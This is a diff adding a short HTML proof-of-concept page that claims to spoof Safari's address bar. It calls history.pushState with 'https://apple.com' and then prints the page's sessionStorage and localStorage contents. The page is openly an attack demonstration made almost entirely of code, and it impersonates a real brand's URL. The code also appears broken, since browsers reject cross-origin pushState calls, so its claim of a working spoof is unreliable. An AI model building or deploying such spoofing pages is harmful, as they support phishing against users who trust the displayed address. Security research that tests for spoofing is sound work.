@@ -1,1 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Safari Storage Spoofing PoC</title>
+  <style>
+    body {
+      font-family: monospace;
+      padding: 20px;
+    }
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+  <h1>Safari Storage Spoofing PoC</h1>
+  <p>This page will try to spoof the address bar and show current sessionStorage & localStorage:</p>
 
+  <pre id="output">Loading storage...</pre>
+
+  <script>
+    // Push spoofed URL to history
+    history.pushState({}, '', 'https://apple.com');
+
+    // Display localStorage and sessionStorage
+    let output = "Session Storage:\n";
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      output += `${key}: ${sessionStorage.getItem(key)}\n`;
+    }
+
+    output += "\nLocal Storage:\n";
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      output += `${key}: ${localStorage.getItem(key)}\n`;
+    }
+
+    document.getElementById("output").innerText = output;
+  </script>
+</body>
+</html>
